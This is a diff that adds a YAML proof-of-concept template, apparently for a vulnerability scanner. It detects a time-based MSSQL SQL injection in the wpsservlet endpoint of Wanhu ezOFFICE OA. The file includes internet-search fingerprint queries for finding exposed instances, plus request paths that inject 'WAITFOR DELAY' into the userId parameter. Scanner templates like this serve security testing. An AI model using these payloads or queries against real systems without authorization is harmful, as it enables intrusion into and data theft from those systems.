@@ -1,0 +1,44 @@
+detail:
+  author: 
+  links:
+    - x
+  vulnerability:
+    level: critical
+    fofa-query: app="万户网络-ezOFFICE"
+    hunter-query: app.name="万户 Ezoffice OA"
+    quake-query: app:"万户ezOFFICE协同管理平台"
+    zoomeye-query: title:"万户ezOFFICE协同管理平台"
+    threatbook-query: 
+    cve: 
+    cnvd: 
+    tips: mssql | 时间注入
+    
+name: poc-yaml-wanhu-ezoffice-wpsservlet-sqli
+manual: true
+transport: http
+set:
+    s1: randomInt(10000000, 90000000)
+    s2: randomLowercase(8)
+    reverse: newReverse()
+    reverseURL: reverse.url
+    t1: timeConvert(now(), '2006-01-02')
+rules:
+    r0:
+        request:
+            cache: true
+            method: GET
+            path: /defaultroot/wpsservlet?option=getSign&userId=1;WAITFOR%20DELAY%20%270:0:4%27--&orgIdString=1&domainId=1
+            headers:
+            body:           
+        expression: response.status == 200 && response.latency >= 4000
+
+    r1:
+        request:
+            cache: true
+            method: GET
+            path: /defaultroot/wpsservlet?option=getSign&userId=1;WAITFOR%20DELAY%20%270:0:5%27--&orgIdString=1&domainId=1
+            headers:
+            body:
+        expression: response.status == 200 && response.latency >= 5000
+
+expression: r0() 
